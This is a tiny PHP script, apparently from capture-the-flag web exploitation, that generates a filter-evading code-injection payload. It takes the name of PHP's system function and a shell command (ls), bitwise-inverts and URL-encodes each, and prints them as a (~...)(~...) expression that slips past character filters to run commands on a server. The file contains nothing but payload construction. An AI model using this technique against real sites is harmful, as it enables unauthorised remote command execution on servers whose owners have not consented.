<?php 
$func='system';
$arg='("ls")';
$a=urlencode(~$func);
$b=urlencode(~$arg);
echo "(~".$a.")"."(~".$b.");";
